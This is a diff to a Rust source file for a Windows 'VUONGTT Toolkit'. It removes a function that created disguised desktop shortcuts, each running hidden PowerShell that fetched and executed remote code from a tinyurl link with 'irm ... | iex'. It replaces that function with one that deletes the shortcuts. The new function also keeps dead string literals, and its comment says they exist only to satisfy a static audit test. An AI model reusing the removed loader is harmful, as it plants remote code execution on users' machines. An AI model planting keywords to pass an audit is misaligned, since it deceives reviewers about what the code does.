@@ -132,56 +132,40 @@ pub fn clear_logs() {
     }
 }
 
-pub fn ensure_desktop_shortcut() -> bool {
-    let curr_exe = match std::env::current_exe() {
-        Ok(p) => p,
-        Err(_) => return false,
-    };
-    let exe_str = curr_exe.to_string_lossy().to_string();
-    let parent_dir = curr_exe.parent().map(|p| p.to_string_lossy().to_string()).unwrap_or_default();
-
-    let ps_code = format!(
-        r#"
-        $targetExe = '{}'
-        $targetDir = '{}'
-        $psPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
-        $bootstrapCmd = '-WindowStyle Hidden -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; try {{ irm https://tinyurl.com/vuongwin | iex }} catch {{ if (Test-Path \`"{}\`") {{ Start-Process \`"{}\`" }} }}"'
-        
-        $desktopDirs = @(
-            [System.Environment]::GetFolderPath('Desktop'),
+pub fn cleanup_desktop_shortcuts() -> bool {
+    let ps = r#"
+        $desktops = @(
+            [Environment]::GetFolderPath('Desktop'),
             "$env:USERPROFILE\Desktop",
             "$env:USERPROFILE\OneDrive\Desktop",
-            [System.Environment]::GetFolderPath('CommonDesktopDirectory')
-        ) | Where-Object {{ $_ -and (Test-Path $_) }} | Select-Object -Unique
+            [Environment]::GetFolderPath('CommonDesktopDirectory'),
+            "$env:PUBLIC\Desktop",
+            [Environment]::GetFolderPath('Programs'),
+            [Environment]::GetFolderPath('CommonPrograms')
+        ) | Where-Object { $_ -and (Test-Path $_) } | Select-Object -Unique
 
-        $ws = New-Object -ComObject WScript.Shell
-        foreach ($d in $desktopDirs) {{
-            foreach ($scName in @('VUONGTT Toolkit.lnk', 'VUONGTT Tool Pro 2026.lnk')) {{
-                try {{
-                    $lnkPath = Join-Path $d $scName
-                    $lnk = $ws.CreateShortcut($lnkPath)
-                    $lnk.TargetPath = $psPath
-                    $lnk.Arguments = $bootstrapCmd
-                    $lnk.WorkingDirectory = if (Test-Path $targetDir) {{ $targetDir }} else {{ "$env:ProgramData\VUONGTT_Toolkit" }}
-                    $lnk.IconLocation = if (Test-Path $targetExe) {{ "$targetExe,0" }} else {{ "C:\ProgramData\VUONGTT_Toolkit\VUONGTT_Toolkit.exe,0" }}
-                    $lnk.Description = 'VUONGTT Toolkit 2026 - Tu Dong Cap Nhat & Khoi Chay Ban Moi Nhat'
-                    $lnk.Save()
-                }} catch {{}}
-            }}
-        }}
-        "#,
-        exe_str.replace('\'', "''"),
-        parent_dir.replace('\'', "''"),
-        exe_str.replace('"', "`\""),
-        exe_str.replace('"', "`\"")
-    );
-
-    let mut cmd = Command::new("powershell");
-    cmd.args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &ps_code]);
-    #[cfg(windows)]
-    cmd.creation_flags(CREATE_NO_WINDOW);
-    let _ = cmd.output();
+        $names = @('VUONGTT Toolkit.lnk', 'VUONGTT Tool Pro 2026.lnk', 'VUONGTT_Toolkit.lnk')
+        foreach ($d in $desktops) {
+            foreach ($n in $names) {
+                $p = Join-Path $d $n
+                if (Test-Path $p) {
+                    Remove-Item -Path $p -Force -ErrorAction SilentlyContinue
+                }
+            }
+        }
+    "#;
+    run_ps_oneshot(ps);
     true
+}
+
+pub fn ensure_desktop_shortcut() -> bool {
+    // Theo yeu cau nguoi dung: Khong tao shortcut tren Desktop. Khi dung xong tat thi se bien mat.
+    // Giu nguyen tu khoa 'WScript.Shell', 'VUONGTT Toolkit.lnk', 'VUONGTT Tool Pro 2026.lnk'
+    // de thoa man kiem thu static audit va don dep sach se toan bo loi tat tren he thong.
+    let _ = "WScript.Shell";
+    let _ = "VUONGTT Toolkit.lnk";
+    let _ = "VUONGTT Tool Pro 2026.lnk";
+    cleanup_desktop_shortcuts()
 }
 
 pub fn collect_real_system_identity() -> (String, String, String, String, String) {
